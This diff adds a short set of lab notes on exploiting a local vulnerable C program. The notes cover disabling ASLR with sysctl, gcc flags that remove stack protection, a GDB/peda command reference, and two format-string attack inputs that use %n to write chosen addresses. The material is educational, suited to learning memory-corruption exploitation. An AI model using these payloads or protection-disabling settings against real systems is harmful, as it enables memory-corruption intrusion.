@@ -1,0 +1,54 @@
+Disable ASLR:
+
+sysctl -w kernel.randomize_va_space=0
+
+
+To compile a program : 
+
+gcc -ggdb -z execstack -fno-stack-protector -m32 -o example example.c
+
+
+
+In GDB & peda:
+
+disass (name of function) - disassemble the function and show addresses
+
+
+b F                     Set a break-point at function F.
+b *A                    Set a break-point at absolute address A
+b N                     Set a break-point at line number N.
+b N:F                   Set a break-point at line number N at file F.
+
+stepi or si             Execute one machine instruction (follows a call).
+step or s               Execute one C-program statement (steps into functions).
+stepi N                 Do N machine instructions.
+nexti or ni             Same as si but execute calls as one instructions.
+next or n               Same as ni but execute functions as one statement.
+bt                      Show names of the stack frames.
+up                      Go up one stack frame.
+down                    Go down one stack frame.
+
+
+info reg                List contents of registers.
+p V                     Print contents of a variable V.
+x /CT A                 Examining memory where:
+                        C   number of units to display. 
+                        T   x hex integer.
+                            d dec integer.
+                            u unsigned dec integer.
+                            o octal integer.
+                            c character.
+                            s null terminated string.
+                            i as machine instruction.
+                        A   an absolute address or 
+                            $reg pointed by some register.
+
+
+Format String Attack Commands : 
+
+r $(python -c 'print "\x1c\xa0\x04\x08" + "\x1e\xa0\x04\x08"')-%13665u-%4\$n
+
+Next step : 
+
+r $(python -c 'print "\x1c\xa0\x04\x08" + "\x1e\xa0\x04\x08"')-%13665u-%4\$n%5\$n
+
